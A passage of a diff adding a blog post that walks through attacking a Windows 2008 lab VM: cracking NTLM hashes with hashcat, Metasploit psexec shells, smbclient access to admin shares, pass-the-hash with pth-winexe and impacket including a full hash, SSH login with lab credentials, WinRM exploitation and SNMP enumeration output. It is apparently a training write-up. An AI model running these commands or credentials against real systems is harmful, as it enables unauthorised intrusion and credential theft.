+</h3>
+<p>From the hash retrieved we can use hashcat to compare the hash of a common wordlist against the hashes we have, if it&rsquo;s a hit I will have access to the network such as admin login creds ᶘ ᵒᴥᵒᶅ</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ hashcat -m <span class="m">1000</span> /home/val/Desktop/hashdump.txt -a <span class="m">0</span> /home/val/Downloads/rockyou_1.txt 
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Hashcat" src="Hashcat.png">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">4.4 Getting a shell with PsExec 
+    <div id="44-getting-a-shell-with-psexec" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#44-getting-a-shell-with-psexec" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Microsoft have developed a suite of tools known as sysinternals which provides a set of tools for administrators, they can be found and downloaded from: <a
+  href="https://learn.microsoft.com/en-us/sysinternals/downloads"
+    target="_blank"
+  >https://learn.microsoft.com/en-us/sysinternals/downloads</a></p>
+<p>One of these tools under the process utilities category is the <code>PsExec</code> which is a remote control program which allows sysadmins to execute programs.</p>
+<ol>
+<li>Loading MSF and module <code>windows/smb/psexec</code> to exploit</li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="smb-psexec" src="smb-psexec.png">
+
+  
+</figure>
+</p>
+<ol start="2">
+<li>Gain reverse shell of network with command <code>shell</code></li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="psexec-shell" src="psexec-shell.png">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">4.5 Accessing remote shares using SMBclient 
+    <div id="45-accessing-remote-shares-using-smbclient" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#45-accessing-remote-shares-using-smbclient" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>SMBclient is a tool which allows user talk to a SMB server such as accessing files stored, uploading files from a local machine and retrieving directory information. This is part of the Samba suite.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Access smb server using admin as user input</span>
+</span></span><span class="line"><span class="cl">smbclient -L <span class="se">\\\\</span>172.30.1.23<span class="se">\\</span> -U Administrator
+</span></span></code></pre></div><p>When listing file shares on windows system <code>\\\\</code> is required before the IP and <code>\\</code> after the IP</p>
+<ol>
+<li>
+<p>This will display all the available root directories available for navigation, a folder can then be explored using: <code>smbclient \\\\172.30.1.21\\ADMIN$ -U Administrator</code></p>
+</li>
+<li>
+<p>Discovering Admin folder:</p>
+</li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="smbclient-intial-scan" src="smbclient-intial-scan.png">
+
+  
+</figure>
+</p>
+<ol start="2">
+<li>Discovering C$ folder:</li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="smbclient-C$" src="smbclient-C$.png">
+
+  
+</figure>
+</p>
+<ol start="3">
+<li>Download image file <code>jack_of_diamonds.png</code> with the <code>get</code> command.</li>
+</ol>
+<p>Due to misconfigurations I am able to download sensitive images and logs which could be used to further target an organisation or innocents.</p>
+
+<h2 class="relative group">5 Passing the Hash Technique 
+    <div id="5-passing-the-hash-technique" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#5-passing-the-hash-technique" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Brute-force and dictionary password attacks take long time to perform which isn&rsquo;t ideal for pentesters where they will have time constraints.</p>
+<p>This is where the passing the hash techniques is used as it will capture the NTLM password hash stored by windows system and pass it to the active directory (AD) and Domain Controller (DC) using specific tools to execute code remotely without having to crack password.</p>
+
+<h3 class="relative group">5.1 Getting that shell with PTH-WinExe 
+    <div id="51-getting-that-shell-with-pth-winexe" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#51-getting-that-shell-with-pth-winexe" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Using the Hash gathered from the hashdump earlier, using pass-the-hash for windows module from the <a
+  href="https://www.kali.org/blog/pass-the-hash-toolkit-winexe-updates/"
+    target="_blank"
+  >Pass-The-Hash</a> toolkit to transfer the hash over the network.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b //172.30.1.21 cmd
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="PTH-WinExe" src="PTH-WinExe.png">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">5.2 Impacket, the tool to rule them all 
+    <div id="52-impacket-the-tool-to-rule-them-all" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#52-impacket-the-tool-to-rule-them-all" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Impacket is a suite of networking tools, written in Python, designed for pentesting networks, here are the available tools:</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Impacket-suite" src="Impacket-suite.png">
+
+  
+</figure>
+</p>
+<p>I will be performing a PTH attack with the <code>impacket-psexec</code> Python module on the Win2k8 machine</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-psexec Administrator@172.30.1.21 -hashes aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="impacket-psexec" src="impacket-psexec.png">
+
+  
+</figure>
+</p>
+
+<h2 class="relative group">6. Gaining Access by Exploiting SSH 
+    <div id="6-gaining-access-by-exploiting-ssh" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#6-gaining-access-by-exploiting-ssh" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>SSH is a network protocol which allows administrators to log into a machine and perform remote code execution.</p>
+<ol>
+<li>Nmap scan for common SSH port 22:</li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Nmap-SSH" src="Nmap-SSH.png">
+
+  
+</figure>
+</p>
+<ol start="2">
+<li>Load MSF and the module <code>scanner/ssh/ssh_enumusers</code> to get a list of possible users:</li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="MSF-ssh-enumusers" src="MSF-ssh-enumusers.png">
+
+  
+</figure>
+</p>
+<ol start="3">
+<li>Then use the <code>scanner/ssh/ssh_login</code> MSF module to attempt an SSH login with the credentials Administrator:vagrant.</li>
+</ol>
+<p>We got these from previous sections from hash cracking, use the <code>sessions</code> command to move shell to background</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="SSH-login-MSF" src="SSH-login-MSF.png">
+
+  
+</figure>
+</p>
+<ol start="4">
+<li>Checked sessions ID with <code>sessions</code> and used <code>sessions -i &lt;session-ID&gt;</code></li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="SSH-Sessions" src="SSH-Sessions.png">
+
+  
+</figure>
+</p>
+
+<h2 class="relative group">7. Exploiting Windows Remote Management WinRM 
+    <div id="7-exploiting-windows-remote-management-winrm" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#7-exploiting-windows-remote-management-winrm" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+  
+  
+  
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md" style="background-color: #e5f0fc"
+  
+  >
+  <span
+    
+      class="ltr:pr-3 rtl:pl-3 flex items-center" style="color: #086ddd"
+    
+    >
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 32C114.6 32 .0272 125.1 .0272 240c0 49.63 21.35 94.98 56.97 130.7c-12.5 50.37-54.27 95.27-54.77 95.77c-2.25 2.25-2.875 5.734-1.5 8.734C1.979 478.2 4.75 480 8 480c66.25 0 115.1-31.76 140.6-51.39C181.2 440.9 217.6 448 256 448c141.4 0 255.1-93.13 255.1-208S397.4 32 256 32z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      style="color: #086ddd"
+    
+    >More details at <a
+  href="https://learn.microsoft.com/en-us/windows/win32/winrm/portal"
+    target="_blank"
+  >https://learn.microsoft.com/en-us/windows/win32/winrm/portal</a></span>
+</div>
+
+<p>WinRM is a protocol which allows administrators to remotely manage computers on a network. Commonly found on port HTTP-5985 and HTTPS-5986.</p>
+
+<h3 class="relative group">7.1 WinRM enumerating with MSF 
+    <div id="71-winrm-enumerating-with-msf" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#71-winrm-enumerating-with-msf" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li>Nmap script scan on port 5985:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -A -p <span class="m">5985</span> 172.30.1.21
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="WinRM-Nmap-Scan" src="WinRM-Nmap-Scan.png">
+
+  
+</figure>
+</p>
+<ol start="2">
+<li>Load MSF and the module <code>auxiliary/scanner/winrm/winrm_cmd</code></li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="MSF-WinRm" src="MSF-WinRm.png">
+
+  
+</figure>
+</p>
+<ol start="3">
+<li>Fill out options for MSF WinRM module and execute the exploit</li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="MSF-WinRM-Execute" src="MSF-WinRM-Execute.png">
+
+  
+</figure>
+</p>
+<p>Result:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Windows IP Configuration                                                                   
+</span></span><span class="line"><span class="cl">   Host Name . . . . . . . . . . . . : vagrant-2008R2                                                       
+</span></span><span class="line"><span class="cl">   Primary Dns Suffix  . . . . . . . :                                                                      
+</span></span><span class="line"><span class="cl">   Node Type . . . . . . . . . . . . : Hybrid
+</span></span><span class="line"><span class="cl">   IP Routing Enabled. . . . . . . . : No
+</span></span><span class="line"><span class="cl">   WINS Proxy Enabled. . . . . . . . : No
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Ethernet adapter Local Area Connection 2:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
+</span></span><span class="line"><span class="cl">   Description . . . . . . . . . . . : Intel<span class="o">(</span>R<span class="o">)</span> PRO/1000 MT Desktop Adapter <span class="c1">#2</span>
+</span></span><span class="line"><span class="cl">   Physical Address. . . . . . . . . : 08-00-27-66-C5-26
+</span></span><span class="line"><span class="cl">   DHCP Enabled. . . . . . . . . . . : Yes
+</span></span><span class="line"><span class="cl">   Autoconfiguration Enabled . . . . : Yes
+</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::1152:69be:3691:de8%14<span class="o">(</span>Preferred<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.11.12.22<span class="o">(</span>Preferred<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+</span></span><span class="line"><span class="cl">   Lease Obtained. . . . . . . . . . : Saturday, May 04, <span class="m">2024</span> 10:15:24 PM
+</span></span><span class="line"><span class="cl">   Lease Expires . . . . . . . . . . : Saturday, May 04, <span class="m">2024</span> 10:35:24 PM
+</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . :
+</span></span><span class="line"><span class="cl">   DHCP Server . . . . . . . . . . . : 10.11.12.1
+</span></span><span class="line"><span class="cl">   DHCPv6 IAID . . . . . . . . . . . : <span class="m">319291431</span>
+</span></span><span class="line"><span class="cl">   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2B-A8-88-83-08-00-27-D7-CC-D8
+</span></span><span class="line"><span class="cl">   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
+</span></span><span class="line"><span class="cl">                                       fec0:0:0:ffff::2%1
+</span></span><span class="line"><span class="cl">                                       fec0:0:0:ffff::3%1
+</span></span><span class="line"><span class="cl">   NetBIOS over Tcpip. . . . . . . . : Enabled
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Ethernet adapter Local Area Connection:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
+</span></span><span class="line"><span class="cl">   Description . . . . . . . . . . . : Intel<span class="o">(</span>R<span class="o">)</span> PRO/1000 MT Desktop Adapter
+</span></span><span class="line"><span class="cl">   Physical Address. . . . . . . . . : 08-00-27-D7-CC-D8
+</span></span><span class="line"><span class="cl">   DHCP Enabled. . . . . . . . . . . : Yes
+</span></span><span class="line"><span class="cl">   Autoconfiguration Enabled . . . . : Yes
+</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::fd63:83a2:85e3:4729%11<span class="o">(</span>Preferred<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 172.30.1.21<span class="o">(</span>Preferred<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+</span></span><span class="line"><span class="cl">   Lease Obtained. . . . . . . . . . : Saturday, May 04, <span class="m">2024</span> 10:15:28 PM
+</span></span><span class="line"><span class="cl">   Lease Expires . . . . . . . . . . : Saturday, May 04, <span class="m">2024</span> 10:35:28 PM
+</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . :
+</span></span><span class="line"><span class="cl">   DHCP Server . . . . . . . . . . . : 172.30.1.1
+</span></span><span class="line"><span class="cl">   DHCPv6 IAID . . . . . . . . . . . : <span class="m">235405351</span>
+</span></span><span class="line"><span class="cl">   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2B-A8-88-83-08-00-27-D7-CC-D8
+</span></span><span class="line"><span class="cl">   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
+</span></span><span class="line"><span class="cl">                                       fec0:0:0:ffff::2%1
+</span></span><span class="line"><span class="cl">                                       fec0:0:0:ffff::3%1
+</span></span><span class="line"><span class="cl">   NetBIOS over Tcpip. . . . . . . . : Enabled
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Tunnel adapter isatap.<span class="o">{</span>13E679E5-F4ED-4489-A265-22795E3ACF25<span class="o">}</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Media State . . . . . . . . . . . : Media disconnected
+</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
+</span></span><span class="line"><span class="cl">   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
+</span></span><span class="line"><span class="cl">   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+</span></span><span class="line"><span class="cl">   DHCP Enabled. . . . . . . . . . . : No
+</span></span><span class="line"><span class="cl">   Autoconfiguration Enabled . . . . : Yes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Tunnel adapter isatap.<span class="o">{</span>6FEEDED4-FC1E-4857-BEB8-72167D5BDAA6<span class="o">}</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Media State . . . . . . . . . . . : Media disconnected
+</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
+</span></span><span class="line"><span class="cl">   Description . . . . . . . . . . . : Microsoft ISATAP Adapter <span class="c1">#2</span>
+</span></span><span class="line"><span class="cl">   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+</span></span><span class="line"><span class="cl">   DHCP Enabled. . . . . . . . . . . : No
+</span></span><span class="line"><span class="cl">   Autoconfiguration Enabled . . . . : Yes
+</span></span></code></pre></div>
+<h3 class="relative group">7.2 Exploit winrm with MSF 
+    <div id="72-exploit-winrm-with-msf" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#72-exploit-winrm-with-msf" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li>Very simple for this version of winrm, load MSF module <code>windows/winrm/winrm_script_exec</code> and fill options:</li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="MSF-WinRM-Exploit" src="MSF-WinRM-Exploit.png">
+
+  
+</figure>
+</p>
+<p>result:</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="MSF-WinRM-ExResults" src="MSF-WinRM-ExResults.png">
+
+  
+</figure>
+</p>
+<p><strong>Bruh</strong> we need a lil break from all this talk of computers, lets drink something Ꮚ˘ꍓ˘Ꮚ
+
+
+
+
+
+<img src="Bear-nuah-yes-pink.gif" alt="alt text" style="width: 30px; height: 30px;">
+ That feels much better, just a few more and we&rsquo;re done, thank you for hanging in there even if you don&rsquo;t fully understand, I&rsquo;m just glad you&rsquo;re reading this.</p>
+
+<h2 class="relative group">8. Exploiting Simple Network Management Protocol SNMP with MSF 
+    <div id="8-exploiting-simple-network-management-protocol-snmp-with-msf" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#8-exploiting-simple-network-management-protocol-snmp-with-msf" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>IT professionals will always look for innovative solutions to monitor assets on a network such as clients, servers, network devices. This is where SNMP comes in as it is a very popular networking protocol that allows them to do just that in an easy manner, it utilises <strong>User Datagram Protocol</strong> (UDP)</p>
+<ol>
+<li>Performing an Nmap scan for both UDP and TCP on the common port of 161:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -sU -sT -p U:161,T:161 172.30.1.21
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Nmap-SNMP" src="Nmap-SNMP.png">
+
+  
+</figure>
+</p>
+<ol start="2">
+<li>Load MSF and the module <code>scanner/snmp/snmp_enum</code></li>
+</ol>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="MSF-SNMP-Enum" src="MSF-SNMP-Enum.png">
+
+  
+</figure>
+</p>
+<p>Results:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 172.30.1.21, Connected.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> System information:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host IP                       : 172.30.1.21
+</span></span><span class="line"><span class="cl">Hostname                      : vagrant-2008R2
+</span></span><span class="line"><span class="cl">Description                   : Hardware: Intel64 Family <span class="m">6</span> Model <span class="m">158</span> Stepping <span class="m">10</span> AT/AT COMPATIBLE - Software: Windows Version 6.1 <span class="o">(</span>Build <span class="m">7601</span> Multiprocessor Free<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Contact                       : -
+</span></span><span class="line"><span class="cl">Location                      : -
+</span></span><span class="line"><span class="cl">Uptime snmp                   : 00:44:55.75
+</span></span><span class="line"><span class="cl">Uptime system                 : 00:44:40.24
+</span></span><span class="line"><span class="cl">System date                   : 2024-5-4 23:00:14.2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> User accounts:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;sshd&#34;</span><span class="o">]</span>            
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;Guest&#34;</span><span class="o">]</span>           
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;greedo&#34;</span><span class="o">]</span>          
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;vagrant&#34;</span><span class="o">]</span>         
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;han_solo&#34;</span><span class="o">]</span>        
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;kylo_ren&#34;</span><span class="o">]</span>        
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;boba_fett&#34;</span><span class="o">]</span>       
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;chewbacca&#34;</span><span class="o">]</span>       
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;ben_kenobi&#34;</span><span class="o">]</span>      
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;jabba_hutt&#34;</span><span class="o">]</span>      
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;artoo_detoo&#34;</span><span class="o">]</span>     
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;c_three_pio&#34;</span><span class="o">]</span>     
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;darth_vader&#34;</span><span class="o">]</span>     
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;leia_organa&#34;</span><span class="o">]</span>     
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;sshd_server&#34;</span><span class="o">]</span>     
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;jarjar_binks&#34;</span><span class="o">]</span>    
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;Administrator&#34;</span><span class="o">]</span>   
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;luke_skywalker&#34;</span><span class="o">]</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;anakin_skywalker&#34;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s2">&#34;lando_calrissian&#34;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Network information:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">IP forwarding enabled         : no
+</span></span><span class="line"><span class="cl">Default TTL                   : <span class="m">128</span>
+</span></span><span class="line"><span class="cl">TCP segments received         : <span class="m">852430</span>
+</span></span><span class="line"><span class="cl">TCP segments sent             : <span class="m">823689</span>
+</span></span><span class="line"><span class="cl">TCP segments retrans          : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Input datagrams               : <span class="m">292603</span>
+</span></span><span class="line"><span class="cl">Delivered datagrams           : <span class="m">292896</span>
+</span></span><span class="line"><span class="cl">Output datagrams              : <span class="m">407015</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Network interfaces:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> Software Loopback Interface <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : :::::
+</span></span><span class="line"><span class="cl">Type                          : softwareLoopback
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">1073</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">1500</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> WAN Miniport <span class="o">(</span>SSTP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">2</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : :::::
+</span></span><span class="line"><span class="cl">Type                          : unknown
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">1073</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">4091</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> WAN Miniport <span class="o">(</span>L2TP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">3</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : :::::
+</span></span><span class="line"><span class="cl">Type                          : unknown
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">1073</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">1460</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> WAN Miniport <span class="o">(</span>PPTP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">4</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : :::::
+</span></span><span class="line"><span class="cl">Type                          : unknown
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">1073</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">1464</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> WAN Miniport <span class="o">(</span>PPPOE<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">5</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : :::::
+</span></span><span class="line"><span class="cl">Type                          : ppp
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">1073</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">1494</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> WAN Miniport <span class="o">(</span>IPv6<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">6</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : 88:e2:20:52:41:53
+</span></span><span class="line"><span class="cl">Type                          : ethernet-csmacd
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">1073</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">1500</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> WAN Miniport <span class="o">(</span>Network Monitor<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">7</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : 88:e2:20:52:41:53
+</span></span><span class="line"><span class="cl">Type                          : ethernet-csmacd
